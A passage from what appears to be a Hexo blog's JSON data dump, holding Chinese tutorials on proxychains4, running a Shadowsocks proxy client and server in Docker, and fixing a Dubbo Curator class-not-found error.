-q，如：</p>\n<blockquote>\n<p>添加docker ppa时，由于网络问题，原来的命令<br>sudo add-apt-repository “deb [arch=amd64] <a href=\"https://download.docker.com/linux/ubuntu\" target=\"_blank\" rel=\"noopener\">https://download.docker.com/linux/ubuntu</a> $(lsb_release -cs) stable”<br>不能成功执行，这时命令修改成：<br>sudo proxychains4 add-apt-repository “deb [arch=amd64] <a href=\"https://download.docker.com/linux/ubuntu\" target=\"_blank\" rel=\"noopener\">https://download.docker.com/linux/ubuntu</a> $(lsb_release -cs) stable”<br>使得该命令的网络经过代理，可以成功完成</p>\n<p>还可以：<br>sudo proxychains4 ping <a href=\"http://www.docker.com\" target=\"_blank\" rel=\"noopener\">www.docker.com</a><br>sudo proxychains4 apt-get update<br>sudo proxychains4 -q apt-cache madison mysql-server       (-q 安静模式，不输出proxychains4的日志)<br>sudo proxychains4 apt-get install mysql-server</p>\n</blockquote>\n<p>参考自：<a href=\"https://blog.csdn.net/lee_j_r/article/details/54019691\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/lee_j_r/article/details/54019691</a><br>主要不同点： chrome浏览器代理（修改理由：在没有代理之前，不能打开插件市场安装管理插件，因此修改了代理方式）</p>\n"},{"title":"shadowsocks docker 镜像实现代理 - 客户端（Ubuntu电脑访问服务器使用代理）","date":"2018-09-21T15:39:07.000Z","keywords":null,"rId":"MB-18092101","shadow":true,"_content":"\n基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步  \ndocker 安装见 https://blog.csdn.net/Vincent_Field/article/details/82086197  \nWindows系统的话，已经有现成的软件（[影梭Win.zip](../static/MB18092101-1.zip)），该教程也就没有意义了  \n\n\n## 镜像获取\n-------------\n\ndocker pull uetty/shadowsocks:client\n\n## 使用方法\n-------------\n### 初次启动\n\n> 1. 宿主机上运行启动容器命令：\n>    docker run --net=host --name=socks -t uetty/shadowsocks:client\n>    ctrl + c 退出\n> 2. 进入容器内部：\n>    docker exec -it socks bash\n>    修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：\n>    按i键编辑文件\n>    修改服务器地址、端口、密码、以及加密方式(method)\n>    保存(依次：ctrl + c  ->  输入:wq  ->  回车)\n> 3. 在容器内部运行命令：\n>    sslocal -c /etc/shadowsocks.json -d start\n>    退出容器，先后按下：\n>    ctrl + p     ctrl + q\n> 4. 在宿主机上操作：\n>    依次进入：设置 -> 网络 -> 网络代理 -> 手动 -> socks主机那行：\n>    主机地址填写： 127.0.0.1 端口填写： 1080 忽略主机行填写（默认值）： localhost, 127.0.0.0/8, ::1\n>    关闭设置\n在浏览器上尝试是否代理成功\n\n### 关闭代理方式（第二步根据需要选择）\n\n> 1. 将网络代理手动重新改为禁用\n> \n> 2. 进入容器：\n>    docker exec -it socks bash\n>    执行停止命令：\n>    sslocal -c /etc/shadowsocks.json -d stop\n\n### 重启电脑后重新启动代理\n\n> 1. docker start socks\n> \n> 2. docker exec -it socks bash\n> \n> 3. 此时已进入容器中，执行：\n>    sslocal -c /etc/shadowsocks.json -d start\n> \n> 4. 退出容器，设置中设置手动代理\n\n### 命令行下使用代理\n\n> 1. 在宿主机上执行（从container中将已准备好的工具拷贝出来）：\n>    docker cp socks:/data/proxychains-ng.tar ~/data/proxychains-ng.tar\n>    拷贝出来的位置随意自己决定\n> \n> 2. 解压\n>    cd ~/data\n>    tar xf proxychains-ng.tar\n> \n> 3. 安装\n>    ./configure\n>    make\n>    sudo make install\n>    sudo cp ./src/proxychains.conf /etc/proxychains.conf\n>    cd .. && rm -rf proxychains-ng\n> \n> 4. 修改配置\n>    sudo vim /etc/proxychains.conf\n>    修改最后一行为：\n>    socks5 127.0.0.1 1080\n> \n> 5. 使用\n>    在需要代理的命令前增加：sudo proxychains4\n>    如：\n>    sudo proxychains4 ping www.docker.com\n>    或\n>    sudo proxychains4 -q ping www.docker.com\n\n\n","source":"_posts/2018-09-21_shadowsocks.md","raw":"---\ntitle: shadowsocks docker 镜像实现代理 - 客户端（Ubuntu电脑访问服务器使用代理）\ndate: 2018-09-21 23:39:07\ntags: linux\npermalink: shadowsocks-client\nkeywords: \nrId: MB-18092101\nshadow: true\n---\n\n基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步  \ndocker 安装见 https://blog.csdn.net/Vincent_Field/article/details/82086197  \nWindows系统的话，已经有现成的软件（[影梭Win.zip](../static/MB18092101-1.zip)），该教程也就没有意义了  \n\n\n## 镜像获取\n-------------\n\ndocker pull uetty/shadowsocks:client\n\n## 使用方法\n-------------\n### 初次启动\n\n> 1. 宿主机上运行启动容器命令：\n>    docker run --net=host --name=socks -t uetty/shadowsocks:client\n>    ctrl + c 退出\n> 2. 进入容器内部：\n>    docker exec -it socks bash\n>    修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：\n>    按i键编辑文件\n>    修改服务器地址、端口、密码、以及加密方式(method)\n>    保存(依次：ctrl + c  ->  输入:wq  ->  回车)\n> 3. 在容器内部运行命令：\n>    sslocal -c /etc/shadowsocks.json -d start\n>    退出容器，先后按下：\n>    ctrl + p     ctrl + q\n> 4. 在宿主机上操作：\n>    依次进入：设置 -> 网络 -> 网络代理 -> 手动 -> socks主机那行：\n>    主机地址填写： 127.0.0.1 端口填写： 1080 忽略主机行填写（默认值）： localhost, 127.0.0.0/8, ::1\n>    关闭设置\n在浏览器上尝试是否代理成功\n\n### 关闭代理方式（第二步根据需要选择）\n\n> 1. 将网络代理手动重新改为禁用\n> \n> 2. 进入容器：\n>    docker exec -it socks bash\n>    执行停止命令：\n>    sslocal -c /etc/shadowsocks.json -d stop\n\n### 重启电脑后重新启动代理\n\n> 1. docker start socks\n> \n> 2. docker exec -it socks bash\n> \n> 3. 此时已进入容器中，执行：\n>    sslocal -c /etc/shadowsocks.json -d start\n> \n> 4. 退出容器，设置中设置手动代理\n\n### 命令行下使用代理\n\n> 1. 在宿主机上执行（从container中将已准备好的工具拷贝出来）：\n>    docker cp socks:/data/proxychains-ng.tar ~/data/proxychains-ng.tar\n>    拷贝出来的位置随意自己决定\n> \n> 2. 解压\n>    cd ~/data\n>    tar xf proxychains-ng.tar\n> \n> 3. 安装\n>    ./configure\n>    make\n>    sudo make install\n>    sudo cp ./src/proxychains.conf /etc/proxychains.conf\n>    cd .. && rm -rf proxychains-ng\n> \n> 4. 修改配置\n>    sudo vim /etc/proxychains.conf\n>    修改最后一行为：\n>    socks5 127.0.0.1 1080\n> \n> 5. 使用\n>    在需要代理的命令前增加：sudo proxychains4\n>    如：\n>    sudo proxychains4 ping www.docker.com\n>    或\n>    sudo proxychains4 -q ping www.docker.com\n\n\n","slug":"shadowsocks-client","published":1,"updated":"2020-01-25T11:26:15.054Z","_id":"ck5qhi05y000sg0ukz4jy55t8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步<br>docker 安装见 <a href=\"https://blog.csdn.net/Vincent_Field/article/details/82086197\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Vincent_Field/article/details/82086197</a><br>Windows系统的话，已经有现成的软件（<a href=\"../static/MB18092101-1.zip\">影梭Win.zip</a>），该教程也就没有意义了  </p>\n<h2 id=\"镜像获取\"><a href=\"#镜像获取\" class=\"headerlink\" title=\"镜像获取\"></a>镜像获取</h2><hr>\n<p>docker pull uetty/shadowsocks:client</p>\n<h2 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><hr>\n<h3 id=\"初次启动\"><a href=\"#初次启动\" class=\"headerlink\" title=\"初次启动\"></a>初次启动</h3><blockquote>\n<ol>\n<li>宿主机上运行启动容器命令：<br>docker run –net=host –name=socks -t uetty/shadowsocks:client<br>ctrl + c 退出</li>\n<li>进入容器内部：<br>docker exec -it socks bash<br>修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：<br>按i键编辑文件<br>修改服务器地址、端口、密码、以及加密方式(method)<br>保存(依次：ctrl + c  -&gt;  输入:wq  -&gt;  回车)</li>\n<li>在容器内部运行命令：<br>sslocal -c /etc/shadowsocks.json -d start<br>退出容器，先后按下：<br>ctrl + p     ctrl + q</li>\n<li>在宿主机上操作：<br>依次进入：设置 -&gt; 网络 -&gt; 网络代理 -&gt; 手动 -&gt; socks主机那行：<br>主机地址填写： 127.0.0.1 端口填写： 1080 忽略主机行填写（默认值）： localhost, 127.0.0.0/8, ::1<br>关闭设置<br>在浏览器上尝试是否代理成功</li>\n</ol>\n</blockquote>\n<h3 id=\"关闭代理方式（第二步根据需要选择）\"><a href=\"#关闭代理方式（第二步根据需要选择）\" class=\"headerlink\" title=\"关闭代理方式（第二步根据需要选择）\"></a>关闭代理方式（第二步根据需要选择）</h3><blockquote>\n<ol>\n<li><p>将网络代理手动重新改为禁用</p>\n</li>\n<li><p>进入容器：<br>docker exec -it socks bash<br>执行停止命令：<br>sslocal -c /etc/shadowsocks.json -d stop</p>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"重启电脑后重新启动代理\"><a href=\"#重启电脑后重新启动代理\" class=\"headerlink\" title=\"重启电脑后重新启动代理\"></a>重启电脑后重新启动代理</h3><blockquote>\n<ol>\n<li><p>docker start socks</p>\n</li>\n<li><p>docker exec -it socks bash</p>\n</li>\n<li><p>此时已进入容器中，执行：<br>sslocal -c /etc/shadowsocks.json -d start</p>\n</li>\n<li><p>退出容器，设置中设置手动代理</p>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"命令行下使用代理\"><a href=\"#命令行下使用代理\" class=\"headerlink\" title=\"命令行下使用代理\"></a>命令行下使用代理</h3><blockquote>\n<ol>\n<li><p>在宿主机上执行（从container中将已准备好的工具拷贝出来）：<br>docker cp socks:/data/proxychains-ng.tar ~/data/proxychains-ng.tar<br>拷贝出来的位置随意自己决定</p>\n</li>\n<li><p>解压<br>cd ~/data<br>tar xf proxychains-ng.tar</p>\n</li>\n<li><p>安装<br>./configure<br>make<br>sudo make install<br>sudo cp ./src/proxychains.conf /etc/proxychains.conf<br>cd .. &amp;&amp; rm -rf proxychains-ng</p>\n</li>\n<li><p>修改配置<br>sudo vim /etc/proxychains.conf<br>修改最后一行为：<br>socks5 127.0.0.1 1080</p>\n</li>\n<li><p>使用<br>在需要代理的命令前增加：sudo proxychains4<br>如：<br>sudo proxychains4 ping <a href=\"http://www.docker.com\" target=\"_blank\" rel=\"noopener\">www.docker.com</a><br>或<br>sudo proxychains4 -q ping <a href=\"http://www.docker.com\" target=\"_blank\" rel=\"noopener\">www.docker.com</a></p>\n</li>\n</ol>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<p>基于Ubuntu 18.04测试，这里记录的是Ubuntu客户端使用代理的方式，服务端搭建代理服务器的移步<br>docker 安装见 <a href=\"https://blog.csdn.net/Vincent_Field/article/details/82086197\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Vincent_Field/article/details/82086197</a><br>Windows系统的话，已经有现成的软件（<a href=\"../static/MB18092101-1.zip\">影梭Win.zip</a>），该教程也就没有意义了  </p>\n<h2 id=\"镜像获取\"><a href=\"#镜像获取\" class=\"headerlink\" title=\"镜像获取\"></a>镜像获取</h2><hr>\n<p>docker pull uetty/shadowsocks:client</p>\n<h2 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><hr>\n<h3 id=\"初次启动\"><a href=\"#初次启动\" class=\"headerlink\" title=\"初次启动\"></a>初次启动</h3><blockquote>\n<ol>\n<li>宿主机上运行启动容器命令：<br>docker run –net=host –name=socks -t uetty/shadowsocks:client<br>ctrl + c 退出</li>\n<li>进入容器内部：<br>docker exec -it socks bash<br>修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：<br>按i键编辑文件<br>修改服务器地址、端口、密码、以及加密方式(method)<br>保存(依次：ctrl + c  -&gt;  输入:wq  -&gt;  回车)</li>\n<li>在容器内部运行命令：<br>sslocal -c /etc/shadowsocks.json -d start<br>退出容器，先后按下：<br>ctrl + p     ctrl + q</li>\n<li>在宿主机上操作：<br>依次进入：设置 -&gt; 网络 -&gt; 网络代理 -&gt; 手动 -&gt; socks主机那行：<br>主机地址填写： 127.0.0.1 端口填写： 1080 忽略主机行填写（默认值）： localhost, 127.0.0.0/8, ::1<br>关闭设置<br>在浏览器上尝试是否代理成功</li>\n</ol>\n</blockquote>\n<h3 id=\"关闭代理方式（第二步根据需要选择）\"><a href=\"#关闭代理方式（第二步根据需要选择）\" class=\"headerlink\" title=\"关闭代理方式（第二步根据需要选择）\"></a>关闭代理方式（第二步根据需要选择）</h3><blockquote>\n<ol>\n<li><p>将网络代理手动重新改为禁用</p>\n</li>\n<li><p>进入容器：<br>docker exec -it socks bash<br>执行停止命令：<br>sslocal -c /etc/shadowsocks.json -d stop</p>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"重启电脑后重新启动代理\"><a href=\"#重启电脑后重新启动代理\" class=\"headerlink\" title=\"重启电脑后重新启动代理\"></a>重启电脑后重新启动代理</h3><blockquote>\n<ol>\n<li><p>docker start socks</p>\n</li>\n<li><p>docker exec -it socks bash</p>\n</li>\n<li><p>此时已进入容器中，执行：<br>sslocal -c /etc/shadowsocks.json -d start</p>\n</li>\n<li><p>退出容器，设置中设置手动代理</p>\n</li>\n</ol>\n</blockquote>\n<h3 id=\"命令行下使用代理\"><a href=\"#命令行下使用代理\" class=\"headerlink\" title=\"命令行下使用代理\"></a>命令行下使用代理</h3><blockquote>\n<ol>\n<li><p>在宿主机上执行（从container中将已准备好的工具拷贝出来）：<br>docker cp socks:/data/proxychains-ng.tar ~/data/proxychains-ng.tar<br>拷贝出来的位置随意自己决定</p>\n</li>\n<li><p>解压<br>cd ~/data<br>tar xf proxychains-ng.tar</p>\n</li>\n<li><p>安装<br>./configure<br>make<br>sudo make install<br>sudo cp ./src/proxychains.conf /etc/proxychains.conf<br>cd .. &amp;&amp; rm -rf proxychains-ng</p>\n</li>\n<li><p>修改配置<br>sudo vim /etc/proxychains.conf<br>修改最后一行为：<br>socks5 127.0.0.1 1080</p>\n</li>\n<li><p>使用<br>在需要代理的命令前增加：sudo proxychains4<br>如：<br>sudo proxychains4 ping <a href=\"http://www.docker.com\" target=\"_blank\" rel=\"noopener\">www.docker.com</a><br>或<br>sudo proxychains4 -q ping <a href=\"http://www.docker.com\" target=\"_blank\" rel=\"noopener\">www.docker.com</a></p>\n</li>\n</ol>\n</blockquote>\n"},{"title":"shadowsocks docker 镜像实现代理 - 服务端（搭建代理服务器）","date":"2018-10-01T06:12:30.000Z","keywords":null,"rId":"MB-18100101","shadow":true,"_content":"\n基于Ubuntu 18.04 / Ubuntu 16.04测试，这里记录的是代理服务器的搭建，需要有一台境外的linux(各种发行版本的都行，只要能安装docker)服务器\ndocker 安装见 https://blog.csdn.net/Vincent_Field/article/details/82086197\n\n## 镜像获取\n-------------\n\ndocker pull uetty/shadowsocks:server\n\n## 使用方法\n-------------\n### 初次启动\n\n> 1. 宿主机上运行启动容器命令：\n>    docker run --net=host --name=socks -t uetty/shadowsocks:server\n>    ctrl + c 退出\n> 2. 进入容器内部：\n>    docker exec -it socks bash\n>    修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：\n>    按i键编辑文件\n>    设置端口、密码（可设置多对）、以及加密方式(method)\n>    保存(依次：ctrl + c  ->  输入:wq  ->  回车)\n> 3. 在容器内部运行命令：\n>    ssserver -c /etc/shadowsocks.json -d start\n>    退出容器，先后按下：\n>    ctrl + p     ctrl + q\n在本地电脑使用客户端连接该服务器尝试是否代理成功\n\n### 关闭代理方式（第二步根据需要选择）\n\n> 1. 进入容器：\n>    docker exec -it socks bash\n>    执行停止命令：\n>    ssserver -c /etc/shadowsocks.json -d stop\n\n### 重启服务器后重新启动代理（服务器较少需要重启的情况）\n\n> 1. docker start socks\n> 2. docker exec -it socks bash\n> 3. 此时已进入容器中，执行：\n>    ssserver -c /etc/shadowsocks.json -d start\n\n### 尝试使用客户端连接服务器端代理\n\n> [Windows系统客户端](https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip)\n>\n> [Ubuntu系统客户端教程](./2018-09-21_shadowsocks.md)\n","source":"_posts/2018-10-01_shadowsocks.md","raw":"---\ntitle: shadowsocks docker 镜像实现代理 - 服务端（搭建代理服务器）\ndate: 2018-10-01 14:12:30\ntags: linux\npermalink: shadowsocks-server\nkeywords: \nrId: MB-18100101\nshadow: true\n---\n\n基于Ubuntu 18.04 / Ubuntu 16.04测试，这里记录的是代理服务器的搭建，需要有一台境外的linux(各种发行版本的都行，只要能安装docker)服务器\ndocker 安装见 https://blog.csdn.net/Vincent_Field/article/details/82086197\n\n## 镜像获取\n-------------\n\ndocker pull uetty/shadowsocks:server\n\n## 使用方法\n-------------\n### 初次启动\n\n> 1. 宿主机上运行启动容器命令：\n>    docker run --net=host --name=socks -t uetty/shadowsocks:server\n>    ctrl + c 退出\n> 2. 进入容器内部：\n>    docker exec -it socks bash\n>    修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：\n>    按i键编辑文件\n>    设置端口、密码（可设置多对）、以及加密方式(method)\n>    保存(依次：ctrl + c  ->  输入:wq  ->  回车)\n> 3. 在容器内部运行命令：\n>    ssserver -c /etc/shadowsocks.json -d start\n>    退出容器，先后按下：\n>    ctrl + p     ctrl + q\n在本地电脑使用客户端连接该服务器尝试是否代理成功\n\n### 关闭代理方式（第二步根据需要选择）\n\n> 1. 进入容器：\n>    docker exec -it socks bash\n>    执行停止命令：\n>    ssserver -c /etc/shadowsocks.json -d stop\n\n### 重启服务器后重新启动代理（服务器较少需要重启的情况）\n\n> 1. docker start socks\n> 2. docker exec -it socks bash\n> 3. 此时已进入容器中，执行：\n>    ssserver -c /etc/shadowsocks.json -d start\n\n### 尝试使用客户端连接服务器端代理\n\n> [Windows系统客户端](https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip)\n>\n> [Ubuntu系统客户端教程](./2018-09-21_shadowsocks.md)\n","slug":"shadowsocks-server","published":1,"updated":"2020-01-25T11:26:21.347Z","_id":"ck5qhi05z000ug0ukk5x9ya86","comments":1,"layout":"post","photos":[],"link":"","content":"<p>基于Ubuntu 18.04 / Ubuntu 16.04测试，这里记录的是代理服务器的搭建，需要有一台境外的linux(各种发行版本的都行，只要能安装docker)服务器<br>docker 安装见 <a href=\"https://blog.csdn.net/Vincent_Field/article/details/82086197\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Vincent_Field/article/details/82086197</a></p>\n<h2 id=\"镜像获取\"><a href=\"#镜像获取\" class=\"headerlink\" title=\"镜像获取\"></a>镜像获取</h2><hr>\n<p>docker pull uetty/shadowsocks:server</p>\n<h2 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><hr>\n<h3 id=\"初次启动\"><a href=\"#初次启动\" class=\"headerlink\" title=\"初次启动\"></a>初次启动</h3><blockquote>\n<ol>\n<li>宿主机上运行启动容器命令：<br>docker run –net=host –name=socks -t uetty/shadowsocks:server<br>ctrl + c 退出</li>\n<li>进入容器内部：<br>docker exec -it socks bash<br>修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：<br>按i键编辑文件<br>设置端口、密码（可设置多对）、以及加密方式(method)<br>保存(依次：ctrl + c  -&gt;  输入:wq  -&gt;  回车)</li>\n<li>在容器内部运行命令：<br>ssserver -c /etc/shadowsocks.json -d start<br>退出容器，先后按下：<br>ctrl + p     ctrl + q<br>在本地电脑使用客户端连接该服务器尝试是否代理成功</li>\n</ol>\n</blockquote>\n<h3 id=\"关闭代理方式（第二步根据需要选择）\"><a href=\"#关闭代理方式（第二步根据需要选择）\" class=\"headerlink\" title=\"关闭代理方式（第二步根据需要选择）\"></a>关闭代理方式（第二步根据需要选择）</h3><blockquote>\n<ol>\n<li>进入容器：<br>docker exec -it socks bash<br>执行停止命令：<br>ssserver -c /etc/shadowsocks.json -d stop</li>\n</ol>\n</blockquote>\n<h3 id=\"重启服务器后重新启动代理（服务器较少需要重启的情况）\"><a href=\"#重启服务器后重新启动代理（服务器较少需要重启的情况）\" class=\"headerlink\" title=\"重启服务器后重新启动代理（服务器较少需要重启的情况）\"></a>重启服务器后重新启动代理（服务器较少需要重启的情况）</h3><blockquote>\n<ol>\n<li>docker start socks</li>\n<li>docker exec -it socks bash</li>\n<li>此时已进入容器中，执行：<br>ssserver -c /etc/shadowsocks.json -d start</li>\n</ol>\n</blockquote>\n<h3 id=\"尝试使用客户端连接服务器端代理\"><a href=\"#尝试使用客户端连接服务器端代理\" class=\"headerlink\" title=\"尝试使用客户端连接服务器端代理\"></a>尝试使用客户端连接服务器端代理</h3><blockquote>\n<p><a href=\"https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip\" target=\"_blank\" rel=\"noopener\">Windows系统客户端</a></p>\n<p><a href=\"./2018-09-21_shadowsocks.md\">Ubuntu系统客户端教程</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<p>基于Ubuntu 18.04 / Ubuntu 16.04测试，这里记录的是代理服务器的搭建，需要有一台境外的linux(各种发行版本的都行，只要能安装docker)服务器<br>docker 安装见 <a href=\"https://blog.csdn.net/Vincent_Field/article/details/82086197\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Vincent_Field/article/details/82086197</a></p>\n<h2 id=\"镜像获取\"><a href=\"#镜像获取\" class=\"headerlink\" title=\"镜像获取\"></a>镜像获取</h2><hr>\n<p>docker pull uetty/shadowsocks:server</p>\n<h2 id=\"使用方法\"><a href=\"#使用方法\" class=\"headerlink\" title=\"使用方法\"></a>使用方法</h2><hr>\n<h3 id=\"初次启动\"><a href=\"#初次启动\" class=\"headerlink\" title=\"初次启动\"></a>初次启动</h3><blockquote>\n<ol>\n<li>宿主机上运行启动容器命令：<br>docker run –net=host –name=socks -t uetty/shadowsocks:server<br>ctrl + c 退出</li>\n<li>进入容器内部：<br>docker exec -it socks bash<br>修改 /etc/shadowsocks.json 文件(vim /etc/shadowsocks.json)：<br>按i键编辑文件<br>设置端口、密码（可设置多对）、以及加密方式(method)<br>保存(依次：ctrl + c  -&gt;  输入:wq  -&gt;  回车)</li>\n<li>在容器内部运行命令：<br>ssserver -c /etc/shadowsocks.json -d start<br>退出容器，先后按下：<br>ctrl + p     ctrl + q<br>在本地电脑使用客户端连接该服务器尝试是否代理成功</li>\n</ol>\n</blockquote>\n<h3 id=\"关闭代理方式（第二步根据需要选择）\"><a href=\"#关闭代理方式（第二步根据需要选择）\" class=\"headerlink\" title=\"关闭代理方式（第二步根据需要选择）\"></a>关闭代理方式（第二步根据需要选择）</h3><blockquote>\n<ol>\n<li>进入容器：<br>docker exec -it socks bash<br>执行停止命令：<br>ssserver -c /etc/shadowsocks.json -d stop</li>\n</ol>\n</blockquote>\n<h3 id=\"重启服务器后重新启动代理（服务器较少需要重启的情况）\"><a href=\"#重启服务器后重新启动代理（服务器较少需要重启的情况）\" class=\"headerlink\" title=\"重启服务器后重新启动代理（服务器较少需要重启的情况）\"></a>重启服务器后重新启动代理（服务器较少需要重启的情况）</h3><blockquote>\n<ol>\n<li>docker start socks</li>\n<li>docker exec -it socks bash</li>\n<li>此时已进入容器中，执行：<br>ssserver -c /etc/shadowsocks.json -d start</li>\n</ol>\n</blockquote>\n<h3 id=\"尝试使用客户端连接服务器端代理\"><a href=\"#尝试使用客户端连接服务器端代理\" class=\"headerlink\" title=\"尝试使用客户端连接服务器端代理\"></a>尝试使用客户端连接服务器端代理</h3><blockquote>\n<p><a href=\"https://raw.githubusercontent.com/Uetty/uetty.github.io/master/blog/影梭Win.zip\" target=\"_blank\" rel=\"noopener\">Windows系统客户端</a></p>\n<p><a href=\"./2018-09-21_shadowsocks.md\">Ubuntu系统客户端教程</a></p>\n</blockquote>\n"},{"title":"dubbo启动时class not found org/apache/curator/RetryPolicy","date":"2018-11-15T14:40:56.000Z","keywords":"dubbo, NoClassDefFoundError","rId":"MB-18111501","_content":"\n```\nException in thread \"main\" java.lang.NoClassDefFoundError: org/apache/curator/RetryPolicy\n\tat com.alibaba.dubbo.remoting.zookeeper.curator.CuratorZookeeperTransporter.connect(CuratorZookeeperTransporter.java:27)\n\tat com.alibaba.dubbo.remoting.zookeeper.ZookeeperTransporter$Adaptive.connect(ZookeeperTransporter$Adaptive.java)\n\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistry.<init>(ZookeeperRegistry.java:69)\n\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistryFactory.createRegistry(ZookeeperRegistryFactory.java:38)\n\tat com.alibaba.dubbo.registry.support.AbstractRegistryFactory.getRegistry(AbstractRegistryFactory.java:96)\n\tat com.alibaba.dubbo.registry.RegistryFactory$Adaptive.getRegistry(RegistryFactory$Adaptive.java)\n\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.getRegistry(RegistryProtocol.java:203)\n\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.export(RegistryProtocol.java:137)\n\tat com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:98)\n\tat com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:55)\n\tat com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:60)\n\tat com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)\n\tat com.alibaba.dubbo.config.ServiceConfig.doExportUrlsFor1Protocol(ServiceConfig.java:513)\n\tat com.alibaba.dubbo.config.ServiceConfig.doExportUrls(ServiceConfig.java:358)\n\tat com.alibaba.dubbo.config.ServiceConfig.doExport(ServiceConfig.java:317)\n\tat com.alibaba.dubbo.config.ServiceConfig.export(ServiceConfig.java:216)\n\tat com.alibaba.dubbo.config.spring.ServiceBean.export(ServiceBean.java:291)\n\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:131)\n\tat com.alibaba.dubbo.config.spring.ServiceBean.onApplicationEvent(ServiceBean.java:53)\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.doInvokeListener(SimpleApplicationEventMulticaster.java:172)\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.invokeListener(SimpleApplicationEventMulticaster.java:165)\n\tat org.springframework.context.event.SimpleApplicationEventMulticaster.multicastEvent(SimpleApplicationEventMulticaster.java:139)\n\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:398)\n\tat org.springframework.context.support.AbstractApplicationContext.publishEvent(AbstractApplicationContext.java:355)\n\tat org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:882)\n\tat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549)\n\tat org.springframework.context.support.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:144)\n\tat org.springframework.context.support.ClassPathXmlApplicationContext.<init>(ClassPathXmlApplicationContext.java:95)\n\tat com.uetty.dbo.service.App.main(App.java:18)\nCaused by: java.lang.ClassNotFoundException: org.apache.curator.RetryPolicy\n\tat java.net.URLClassLoader.findClass(URLClassLoader.java:381)\n\tat java.lang.ClassLoader.loadClass(ClassLoader.java:424)\n\tat sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:338)\n\tat java.lang.ClassLoader.loadClass(ClassLoader.java:357)\n\t... 29 more\n```\n\n确保包含如下依赖，注意该依赖所依赖的的zookeeper的jar版本需与zookeeper服务器版本匹配，具体版本对应见zookeeper文档或者一个个版本调试一下试试（如果与zookeeper版本匹配问题会报KeeperErrorCode = Unimplemented错误）\n```\n<dependency>\n    <groupId>org.apache.curator</groupId>\n\t<artifactId>curator-framework</artifactId>\n</dependency>\n```\n\n","source":"_posts/2018-11-15_dubbo_retry_policy.md","raw":"---\ntitle: dubbo启动时class not found org/apache/curator/RetryPolicy\ndate: 2018-11-15 22:40:56\ntags: dubbo\npermalink: dubbo-retry-policy\nkeywords: dubbo, NoClassDefFoundError\nrId: MB-18111501\n---\n\n```\nException in thread \"main\" java.lang.NoClassDefFoundError: org/apache/curator/RetryPolicy\n\tat com.alibaba.dubbo.remoting.zookeeper.curator.CuratorZookeeperTransporter.connect(CuratorZookeeperTransporter.java:27)\n\tat com.alibaba.dubbo.remoting.zookeeper.ZookeeperTransporter$Adaptive.connect(ZookeeperTransporter$Adaptive.java)\n\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistry.<init>(ZookeeperRegistry.java:69)\n\tat com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistryFactory.createRegistry(ZookeeperRegistryFactory.java:38)\n\tat com.alibaba.dubbo.registry.support.AbstractRegistryFactory.getRegistry(AbstractRegistryFactory.java:96)\n\tat com.alibaba.dubbo.registry.RegistryFactory$Adaptive.getRegistry(RegistryFactory$Adaptive.java)\n\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.getRegistry(RegistryProtocol.java:203)\n\tat com.alibaba.dubbo.registry.integration.RegistryProtocol.export(RegistryProtocol.java:137)\n\tat com.alibaba.dubbo.rpc.protocol.ProtocolFilterWrapper.export(ProtocolFilterWrapper.java:98)\n\tat com.alibaba.dubbo.rpc.protocol.ProtocolListenerWrapper.export(ProtocolListenerWrapper.java:55)\n\tat com.alibaba.dubbo.qos.protocol.QosProtocolWrapper.export(QosProtocolWrapper.java:60)\n\tat com.alibaba.dubbo.rpc.Protocol$Adaptive.export(Protocol$Adaptive.java)\n\tat 